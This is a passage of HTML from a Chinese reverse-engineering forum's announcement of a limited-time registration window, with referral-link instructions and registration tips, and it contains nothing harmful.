inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">学</span><span style="display: inline-block; text-indent: initial;">习</span><span style="display: inline-block; text-indent: initial;">交</span><span style="display: inline-block; text-indent: initial;">流</span></span><span><span style="display: inline-block; text-indent: initial;">逆</span><span style="display: inline-block; text-indent: initial;">向</span><span style="display: inline-block; text-indent: initial;">分</span><span style="display: inline-block; text-indent: initial;">析</span></span><span><span style="display: inline-block; text-indent: initial;">技</span><span style="display: inline-block; text-indent: initial;">术</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">为</span><span style="display: inline-block; text-indent: initial;">了</span><span style="display: inline-block; text-indent: initial;">让</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">融</span><span style="display: inline-block; text-indent: initial;">入</span><span style="display: inline-block; text-indent: initial;">更</span><span style="display: inline-block; text-indent: initial;">多</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">新</span><span style="display: inline-block; text-indent: initial;">生</span><span style="display: inline-block; text-indent: initial;">血</span><span style="display: inline-block; text-indent: initial;">液</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">吾</span><span style="display: inline-block; text-indent: initial;">爱</span><span style="display: inline-block; text-indent: initial;">破</span><span style="display: inline-block; text-indent: initial;">解</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">管</span><span style="display: inline-block; text-indent: initial;">理</span><span style="display: inline-block; text-indent: initial;">团</span><span style="display: inline-block; text-indent: initial;">队</span><span style="display: inline-block; text-indent: initial;">商</span><span style="display: inline-block; text-indent: initial;">议</span><span style="display: inline-block; text-indent: initial;">决</span><span style="display: inline-block; text-indent: initial;">定</span><span style="display: inline-block; text-indent: initial;">限</span><span style="display: inline-block; text-indent: initial;">时</span></span><span><span style="display: inline-block; text-indent: initial;">开</span><span style="display: inline-block; text-indent: initial;">放</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span></span><span><span style="display: inline-block; text-indent: initial;">。</span></span></span></p><p style="margin-top: 15px; margin-bottom: 15px; letter-spacing: normal; text-align: start; color: rgb(68, 68, 68);"><strong><span style="color: rgb(255, 0, 0);"><span style="display: inline-block; text-indent: initial;">关</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">官</span><span style="display: inline-block; text-indent: initial;">方</span><span style="display: inline-block; text-indent: initial;">微</span><span style="display: inline-block; text-indent: initial;">信</span><span style="display: inline-block; text-indent: initial;">随</span><span style="display: inline-block; text-indent: initial;">时</span><span style="display: inline-block; text-indent: initial;">了</span><span style="display: inline-block; text-indent: initial;">解</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">开</span><span style="display: inline-block; text-indent: initial;">放</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">等</span><span style="display: inline-block; text-indent: initial;">信</span><span style="display: inline-block; text-indent: initial;">息</span><span style="display: inline-block; text-indent: initial;">还</span><span style="display: inline-block; text-indent: initial;">可</span><span style="display: inline-block; text-indent: initial;">以</span><span style="display: inline-block; text-indent: initial;">每</span><span style="display: inline-block; text-indent: initial;">天</span><span style="display: inline-block; text-indent: initial;">签</span><span style="display: inline-block; text-indent: initial;">到</span><span style="display: inline-block; text-indent: initial;">领</span><span style="display: inline-block; text-indent: initial;">C</span><span style="display: inline-block; text-indent: initial;">B</span><span style="display: inline-block; text-indent: initial;">！</span></span></strong></p><h2 style="margin-top: 20px; margin-bottom: 20px; font-weight: bold; font-size: 24px; color: rgb(53, 53, 53); letter-spacing: normal; text-align: start; border-bottom: 2px solid rgb(204, 204, 204);"><span style="display: inline-block; text-indent: initial;">开</span><span style="display: inline-block; text-indent: initial;">放</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">时</span><span style="display: inline-block; text-indent: initial;">间</span></h2><p style="margin-top: 15px; margin-bottom: 15px; letter-spacing: normal; text-align: start; color: rgb(68, 68, 68);"><span><span style="display: inline-block; text-indent: initial;">为</span><span style="display: inline-block; text-indent: initial;">了</span><span style="display: inline-block; text-indent: initial;">避</span><span style="display: inline-block; text-indent: initial;">免</span><span style="display: inline-block; text-indent: initial;">由</span><span style="display: inline-block; text-indent: initial;">开</span><span style="display: inline-block; text-indent: initial;">放</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">带</span><span style="display: inline-block; text-indent: initial;">来</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">负</span><span style="display: inline-block; text-indent: initial;">面</span><span style="display: inline-block; text-indent: initial;">影</span><span style="display: inline-block; text-indent: initial;">响</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">我</span><span style="display: inline-block; text-indent: initial;">们</span><span style="display: inline-block; text-indent: initial;">将</span><span style="display: inline-block; text-indent: initial;">加</span><span style="display: inline-block; text-indent: initial;">强</span><span style="display: inline-block; text-indent: initial;">对</span><span style="display: inline-block; text-indent: initial;">新</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">用</span><span style="display: inline-block; text-indent: initial;">户</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">管</span><span style="display: inline-block; text-indent: initial;">理</span><span style="display: inline-block; text-indent: initial;">。</span><span style="display: inline-block; text-indent: initial;">对</span><span style="display: inline-block; text-indent: initial;">于</span><span style="display: inline-block; text-indent: initial;">发</span><span style="display: inline-block; text-indent: initial;">现</span><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">马</span><span style="display: inline-block; text-indent: initial;">甲</span><span style="display: inline-block; text-indent: initial;">或</span><span style="display: inline-block; text-indent: initial;">者</span><span style="display: inline-block; text-indent: initial;">新</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">用</span><span style="display: inline-block; text-indent: initial;">户</span><span style="display: inline-block; text-indent: initial;">从</span><span style="display: inline-block; text-indent: initial;">事</span><span style="display: inline-block; text-indent: initial;">违</span><span style="display: inline-block; text-indent: initial;">规</span><span style="display: inline-block; text-indent: initial;">行</span><span style="display: inline-block; text-indent: initial;">为</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">情</span><span style="display: inline-block; text-indent: initial;">况</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">我</span><span style="display: inline-block; text-indent: initial;">们</span><span style="display: inline-block; text-indent: initial;">会</span><span style="display: inline-block; text-indent: initial;">采</span><span style="display: inline-block; text-indent: initial;">取</span><span style="display: inline-block; text-indent: initial;">更</span><span style="display: inline-block; text-indent: initial;">加</span><span style="display: inline-block; text-indent: initial;">严</span><span style="display: inline-block; text-indent: initial;">格</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">处</span><span style="display: inline-block; text-indent: initial;">理</span><span style="display: inline-block; text-indent: initial;">措</span><span style="display: inline-block; text-indent: initial;">施</span><span style="display: inline-block; text-indent: initial;">。</span><span style="display: inline-block; text-indent: initial;">在</span><span style="display: inline-block; text-indent: initial;">您</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">前</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">请</span><span style="display: inline-block; text-indent: initial;">认</span><span style="display: inline-block; text-indent: initial;">真</span><span style="display: inline-block; text-indent: initial;">阅</span><span style="display: inline-block; text-indent: initial;">读</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">须</span><span style="display: inline-block; text-indent: initial;">知</span><span style="display: inline-block; text-indent: initial;">以</span><span style="display: inline-block; text-indent: initial;">及</span><span style="display: inline-block; text-indent: initial;">社</span><span style="display: inline-block; text-indent: initial;">区</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">总</span><span style="display: inline-block; text-indent: initial;">版</span><span style="display: inline-block; text-indent: initial;">规</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">以</span><span style="display: inline-block; text-indent: initial;">便</span><span style="display: inline-block; text-indent: initial;">更</span><span style="display: inline-block; text-indent: initial;">好</span><span style="display: inline-block; text-indent: initial;">地</span><span style="display: inline-block; text-indent: initial;">适</span><span style="display: inline-block; text-indent: initial;">应</span><span style="display: inline-block; text-indent: initial;">和</span><span style="display: inline-block; text-indent: initial;">享</span><span style="display: inline-block; text-indent: initial;">受</span><span style="display: inline-block; text-indent: initial;">我</span><span style="display: inline-block; text-indent: initial;">们</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">社</span><span style="display: inline-block; text-indent: initial;">区</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">具</span><span style="display: inline-block; text-indent: initial;">体</span><span style="display: inline-block; text-indent: initial;">限</span><span style="display: inline-block; text-indent: initial;">时</span><span style="display: inline-block; text-indent: initial;">开</span><span style="display: inline-block; text-indent: initial;">放</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">时</span><span style="display: inline-block; text-indent: initial;">间</span><span style="display: inline-block; text-indent: initial;">如</span><span style="display: inline-block; text-indent: initial;">下</span><span style="display: inline-block; text-indent: initial;">：</span></span><span style="font-size: 14px;"></span></p><p style="margin-top: 15px; margin-bottom: 15px; letter-spacing: normal; text-align: start; color: rgb(68, 68, 68);"><span style="font-size: 14px;"><strong><span style="color: rgb(255, 0, 0);"><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;">24</span><span style="display: inline-block; text-indent: initial;">年</span><span style="display: inline-block; text-indent: initial;">7</span><span style="display: inline-block; text-indent: initial;">月</span><span style="display: inline-block; text-indent: initial;">21</span><span style="display: inline-block; text-indent: initial;">日</span><span style="display: inline-block; text-indent: initial;"> </span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">：</span></span></strong><strong><span style="color: rgb(255, 0, 0);"><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;"> </span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;"> </span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">4</span><span style="display: inline-block; text-indent: initial;">：</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;"> </span><span style="display: inline-block; text-indent: initial;">和</span><span style="display: inline-block; text-indent: initial;"> </span><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;">：</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;"> </span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;"> </span><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">：</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;">0</span></span></strong></span></p><h2 style="margin-top: 20px; margin-bottom: 20px; font-weight: bold; font-size: 24px; color: rgb(53, 53, 53); letter-spacing: normal; text-align: start; border-bottom: 2px solid rgb(204, 204, 204);"><span style="display: inline-block; text-indent: initial;">邀</span><span style="display: inline-block; text-indent: initial;">请</span><span style="display: inline-block; text-indent: initial;">获</span><span style="display: inline-block; text-indent: initial;">得</span><span style="display: inline-block; text-indent: initial;">贡</span><span style="display: inline-block; text-indent: initial;">献</span></h2><ul class="list-paddingleft-1" style="padding-left: 0px; color: rgb(53, 53, 53);"><li style="margin-left: 2px;"><p style="margin-bottom: 15px;"><span style="font-size: 14px;"><span style="font-size: 14px; font-weight: 700;">大家可以推荐自己的朋友注册</span>，从而增加自己的<span style="font-size: 14px; font-weight: 700;">贡献值</span>，只要通过你推荐的地址注册，你就会增加一个贡献值，注册完可以炫耀一下贡献值啦，你可以把我的账号改成你的账号就是你的推广地址啦，比如我的推广地址可以是以下链接：</span></p><blockquote style="margin-top: 0px; margin-bottom: 0px; color: rgb(106, 115, 125); padding-top: 0px; padding-right: 1em; padding-left: 1em; border-left-width: 0.25em; border-left-color: rgb(223, 226, 229);"><p style="margin-bottom: 15px;"><span style="font-size: 14px;">https://www.52pojie.cn/?fromuser=LCG</span><span style="font-size: 14px;"> 【把LCG换成自己的账号即可】</span></p><p><span style="font-size: 14px;">https://www.52pojie.cn/?fromuid=14</span><span style="font-size: 14px;"> 【把14换成自己的UID即可，UID查看：</span><span style="font-size: 14px;">https://www.52pojie.cn/home.php?mod=space&amp;do=profile</span><span style="font-size: 14px;"> 】</span></p></blockquote></li></ul><h2 style="margin-top: 20px; margin-bottom: 20px; font-weight: bold; font-size: 24px; color: rgb(53, 53, 53); letter-spacing: normal; text-align: start; border-bottom: 2px solid rgb(204, 204, 204);"><span style="color: rgb(255, 0, 0);"><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">要</span><span style="display: inline-block; text-indent: initial;">准</span><span style="display: inline-block; text-indent: initial;">备</span><span style="display: inline-block; text-indent: initial;">什</span><span style="display: inline-block; text-indent: initial;">么</span><span style="display: inline-block; text-indent: initial;">？</span></span></h2><ol class="list-paddingleft-1" style="padding-left: 0px; color: rgb(53, 53, 53);"><li><p style="line-height: 1.6;"><span style="font-size: 14px;"><span style="display: inline-block; text-indent: initial;">★</span><span style="display: inline-block; text-indent: initial;">★</span><span style="display: inline-block; text-indent: initial;">★</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">前</span><span style="display: inline-block; text-indent: initial;">优</span><span style="display: inline-block; text-indent: initial;">先</span><span style="display: inline-block; text-indent: initial;">阅</span><span style="display: inline-block; text-indent: initial;">读</span><span style="display: inline-block; text-indent: initial;"> </span><strong style="line-height: 1.6;"><span style="color: rgb(255, 0, 0); line-height: 1.6;"><span style="display: inline-block; text-indent: initial;">验</span><span style="display: inline-block; text-indent: initial;">证</span><span style="display: inline-block; text-indent: initial;">码</span><span style="display: inline-block; text-indent: initial;">异</span><span style="display: inline-block; text-indent: initial;">常</span><span style="display: inline-block; text-indent: initial;">问</span><span style="display: inline-block; text-indent: initial;">题</span><span style="display: inline-block; text-indent: initial;">、</span><span style="display: inline-block; text-indent: initial;">等</span><span style="display: inline-block; text-indent: initial;">待</span><span style="display: inline-block; text-indent: initial;">验</span><span style="display: inline-block; text-indent: initial;">证</span><span style="display: inline-block; text-indent: initial;">会</span><span style="display: inline-block; text-indent: initial;">员</span><span style="display: inline-block; text-indent: initial;">问</span><span style="display: inline-block; text-indent: initial;">题</span><span style="display: inline-block; text-indent: initial;">、</span><span style="display: inline-block; text-indent: initial;">邮</span><span style="display: inline-block; text-indent: initial;">件</span><span style="display: inline-block; text-indent: initial;">激</span><span style="display: inline-block; text-indent: initial;">活</span><span style="display: inline-block; text-indent: initial;">问</span><span style="display: inline-block; text-indent: initial;">题</span></span></strong><span style="display: inline-block; text-indent: initial;"> </span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">帮</span><span style="display: inline-block; text-indent: initial;">助</span><span style="display: inline-block; text-indent: initial;">你</span><span style="display: inline-block; text-indent: initial;">快</span><span style="display: inline-block; text-indent: initial;">速</span><span style="display: inline-block; text-indent: initial;">准</span><span style="display: inline-block; text-indent: initial;">确</span><span style="display: inline-block; text-indent: initial;">成</span><span style="display: inline-block; text-indent: initial;">功</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">到</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">请</span><span style="display: inline-block; text-indent: initial;">参</span><span style="display: inline-block; text-indent: initial;">看</span><span style="display: inline-block; text-indent: initial;">地</span><span style="display: inline-block; text-indent: initial;">址</span><span style="display: inline-block; text-indent: initial;">：</span></span><span style="font-size: 14px;"><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">p</span><span style="display: inline-block; text-indent: initial;">s</span><span style="display: inline-block; text-indent: initial;">:</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">w</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">5</span><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">p</span><span style="display: inline-block; text-indent: initial;">o</span><span style="display: inline-block; text-indent: initial;">j</span><span style="display: inline-block; text-indent: initial;">i</span><span style="display: inline-block; text-indent: initial;">e</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">c</span><span style="display: inline-block; text-indent: initial;">n</span><span style="display: inline-block; text-indent: initial;">/</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">r</span><span style="display: inline-block; text-indent: initial;">e</span><span style="display: inline-block; text-indent: initial;">a</span><span style="display: inline-block; text-indent: initial;">d</span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;">9</span><span style="display: inline-block; text-indent: initial;">8</span><span style="display: inline-block; text-indent: initial;">5</span><span style="display: inline-block; text-indent: initial;">8</span><span style="display: inline-block; text-indent: initial;">5</span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">.</span><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">t</span><span style="display: inline-block; text-indent: initial;">m</span><span style="display: inline-block; text-indent: initial;">l</span></span></p></li><li><p style="line-height: 1.6;"><span style="font-size: 14px;"><span style="display: inline-block; text-indent: initial;">需</span><span style="display: inline-block; text-indent: initial;">要</span><span style="display: inline-block; text-indent: initial;">确</span><span style="display: inline-block; text-indent: initial;">认</span><span style="display: inline-block; text-indent: initial;">你</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">用</span><span style="display: inline-block; text-indent: initial;">户</span><span style="display: inline-block; text-indent: initial;">名</span><span style="display: inline-block; text-indent: initial;">和</span><span style="display: inline-block; text-indent: initial;">邮</span><span style="display: inline-block; text-indent: initial;">箱</span><span style="display: inline-block; text-indent: initial;">是</span><span style="display: inline-block; text-indent: initial;">否</span><span style="display: inline-block; text-indent: initial;">被</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">过</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">选</span><span style="display: inline-block; text-indent: initial;">择</span><span style="display: inline-block; text-indent: initial;">一</span><span style="display: inline-block; text-indent: initial;">个</span><span style="display: inline-block; text-indent: initial;">没</span><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">人</span><span style="display: inline-block; text-indent: initial;">使</span><span style="display: inline-block; text-indent: initial;">用</span><span style="display: inline-block; text-indent: initial;">过</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">信</span><span style="display: inline-block; text-indent: initial;">息</span><span style="display: inline-block; text-indent: initial;">来</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">到</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">页</span><span style="display: inline-block; text-indent: initial;">面</span><span style="display: inline-block; text-indent: initial;">在</span><span style="display: inline-block; text-indent: initial;">用</span><span style="display: inline-block; text-indent: initial;">户</span><span style="display: inline-block; text-indent: initial;">名</span><span style="display: inline-block; text-indent: initial;">和</span><span style="display: inline-block; text-indent: initial;">E</span><span style="display: inline-block; text-indent: initial;">m</span><span style="display: inline-block; text-indent: initial;">a</span><span style="display: inline-block; text-indent: initial;">i</span><span style="display: inline-block; text-indent: initial;">l</span><span style="display: inline-block; text-indent: initial;">栏</span><span style="display: inline-block; text-indent: initial;">输</span><span style="display: inline-block; text-indent: initial;">入</span><span style="display: inline-block; text-indent: initial;">你</span><span style="display: inline-block; text-indent: initial;">想</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">信</span><span style="display: inline-block; text-indent: initial;">息</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">如</span><span style="display: inline-block; text-indent: initial;">果</span><span style="display: inline-block; text-indent: initial;">被</span><span style="display: inline-block; text-indent: initial;">使</span><span style="display: inline-block; text-indent: initial;">用</span><span style="display: inline-block; text-indent: initial;">了</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">后</span><span style="display: inline-block; text-indent: initial;">面</span><span style="display: inline-block; text-indent: initial;">会</span><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">提</span><span style="display: inline-block; text-indent: initial;">示</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">预</span><span style="display: inline-block; text-indent: initial;">祝</span><span style="display: inline-block; text-indent: initial;">你</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">信</span><span style="display: inline-block; text-indent: initial;">息</span><span style="display: inline-block; text-indent: initial;">独</span><span style="display: inline-block; text-indent: initial;">一</span><span style="display: inline-block; text-indent: initial;">无</span><span style="display: inline-block; text-indent: initial;">二</span><span style="display: inline-block; text-indent: initial;">！</span></span></p></li><li><p style="line-height: 1.6;"><span style="font-size: 14px;"><span style="display: inline-block; text-indent: initial;">查</span><span style="display: inline-block; text-indent: initial;">看</span><span style="display: inline-block; text-indent: initial;">系</span><span style="display: inline-block; text-indent: initial;">统</span><span style="display: inline-block; text-indent: initial;">时</span><span style="display: inline-block; text-indent: initial;">间</span><span style="display: inline-block; text-indent: initial;">是</span><span style="display: inline-block; text-indent: initial;">否</span><span style="display: inline-block; text-indent: initial;">正</span><span style="display: inline-block; text-indent: initial;">确</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">包</span><span style="display: inline-block; text-indent: initial;">括</span><span style="display: inline-block; text-indent: initial;">年</span><span style="display: inline-block; text-indent: initial;">月</span><span style="display: inline-block; text-indent: initial;">日</span><span style="display: inline-block; text-indent: initial;">分</span><span style="display: inline-block; text-indent: initial;">钟</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">如</span><span style="display: inline-block; text-indent: initial;">果</span><span style="display: inline-block; text-indent: initial;">不</span><span style="display: inline-block; text-indent: initial;">正</span><span style="display: inline-block; text-indent: initial;">确</span><span style="display: inline-block; text-indent: initial;">可</span><span style="display: inline-block; text-indent: initial;">能</span><span style="display: inline-block; text-indent: initial;">造</span><span style="display: inline-block; text-indent: initial;">成</span><span style="display: inline-block; text-indent: initial;">验</span><span style="display: inline-block; text-indent: initial;">证</span><span style="display: inline-block; text-indent: initial;">码</span><span style="display: inline-block; text-indent: initial;">输</span><span style="display: inline-block; text-indent: initial;">入</span><span style="display: inline-block; text-indent: initial;">不</span><span style="display: inline-block; text-indent: initial;">正</span><span style="display: inline-block; text-indent: initial;">确</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">还</span><span style="display: inline-block; text-indent: initial;">可</span><span style="display: inline-block; text-indent: initial;">以</span><span style="display: inline-block; text-indent: initial;">清</span><span style="display: inline-block; text-indent: initial;">空</span><span style="display: inline-block; text-indent: initial;">下</span><span style="display: inline-block; text-indent: initial;">浏</span><span style="display: inline-block; text-indent: initial;">览</span><span style="display: inline-block; text-indent: initial;">器</span><span style="display: inline-block; text-indent: initial;">缓</span><span style="display: inline-block; text-indent: initial;">存</span><span style="display: inline-block; text-indent: initial;">和</span><span style="display: inline-block; text-indent: initial;">c</span><span style="display: inline-block; text-indent: initial;">o</span><span style="display: inline-block; text-indent: initial;">o</span><span style="display: inline-block; text-indent: initial;">k</span><span style="display: inline-block; text-indent: initial;">i</span><span style="display: inline-block; text-indent: initial;">e</span><span style="display: inline-block; text-indent: initial;">。</span></span></p></li><li><p style="line-height: 1.6;"><span style="font-size: 14px;"><span style="display: inline-block; text-indent: initial;">前</span><span style="display: inline-block; text-indent: initial;">三</span><span style="display: inline-block; text-indent: initial;">步</span><span style="display: inline-block; text-indent: initial;">做</span><span style="display: inline-block; text-indent: initial;">好</span><span style="display: inline-block; text-indent: initial;">以</span><span style="display: inline-block; text-indent: initial;">后</span><span style="display: inline-block; text-indent: initial;">来</span><span style="display: inline-block; text-indent: initial;">到</span><span style="display: inline-block; text-indent: initial;">最</span><span style="display: inline-block; text-indent: initial;">重</span><span style="display: inline-block; text-indent: initial;">要</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">第</span><span style="display: inline-block; text-indent: initial;">四</span><span style="display: inline-block; text-indent: initial;">步</span><span style="display: inline-block; text-indent: initial;">：</span></span><span style="font-size: 14px;"><span style="display: inline-block; text-indent: initial;">通</span><span style="display: inline-block; text-indent: initial;">过</span><span style="display: inline-block; text-indent: initial;">邮</span><span style="display: inline-block; text-indent: initial;">箱</span><span style="display: inline-block; text-indent: initial;">激</span><span style="display: inline-block; text-indent: initial;">活</span><span style="display: inline-block; text-indent: initial;">账</span><span style="display: inline-block; text-indent: initial;">号</span><span style="display: inline-block; text-indent: initial;">，</span><strong style="line-height: 1.6;"><span style="color: rgb(0, 0, 255); line-height: 1.6;"><span style="display: inline-block; text-indent: initial;">在</span><span style="display: inline-block; text-indent: initial;">没</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">前</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">需</span><span style="display: inline-block; text-indent: initial;">要</span><span style="display: inline-block; text-indent: initial;">先</span><span style="display: inline-block; text-indent: initial;">将</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">域</span><span style="display: inline-block; text-indent: initial;">名</span><span style="display: inline-block; text-indent: initial;">加</span><span style="display: inline-block; text-indent: initial;">入</span><span style="display: inline-block; text-indent: initial;">到</span><span style="display: inline-block; text-indent: initial;">将</span><span style="display: inline-block; text-indent: initial;">要</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">邮</span><span style="display: inline-block; text-indent: initial;">箱</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">白</span><span style="display: inline-block; text-indent: initial;">名</span><span style="display: inline-block; text-indent: initial;">单</span><span style="display: inline-block; text-indent: initial;">中</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">以</span><span style="display: inline-block; text-indent: initial;">便</span><span style="display: inline-block; text-indent: initial;">可</span><span style="display: inline-block; text-indent: initial;">以</span><span style="display: inline-block; text-indent: initial;">准</span><span style="display: inline-block; text-indent: initial;">确</span><span style="display: inline-block; text-indent: initial;">无</span><span style="display: inline-block; text-indent: initial;">误</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">收</span><span style="display: inline-block; text-indent: initial;">到</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">发</span><span style="display: inline-block; text-indent: initial;">送</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: 